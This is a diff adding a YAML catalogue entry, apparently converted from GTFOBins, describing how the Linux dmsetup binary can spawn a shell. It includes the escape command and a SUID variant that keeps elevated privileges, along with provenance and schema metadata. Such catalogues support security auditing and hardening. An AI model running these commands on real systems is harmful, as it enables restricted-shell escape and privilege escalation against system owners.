@@ -1,0 +1,88 @@
+id: gtfobins/dmsetup/shell/unprivileged
+type: binary
+platform: linux
+name: dmsetup
+phases:
+- execution
+capabilities:
+- shell
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: 'dmsetup create base <<EOF
+
+    0 3534848 linear /dev/loop0 94208
+
+    EOF
+
+    dmsetup ls --exec ''/bin/sh -s'''
+references:
+- https://gtfobins.github.io/gtfobins/dmsetup/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        dmsetup:
+          functions:
+            shell:
+            - code: 'dmsetup create base <<EOF
+
+                0 3534848 linear /dev/loop0 94208
+
+                EOF
+
+                dmsetup ls --exec ''/bin/sh -s'''
+              contexts:
+                sudo: null
+                suid:
+                  code: 'dmsetup create base <<EOF
+
+                    0 3534848 linear /dev/loop0 94208
+
+                    EOF
+
+                    dmsetup ls --exec ''/bin/sh -p -s'''
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/dmsetup/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: shell
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:6b3c9352aa5937b3756e0f85804c7021c01bfb4e5804c158b53ea1fa0a34065a
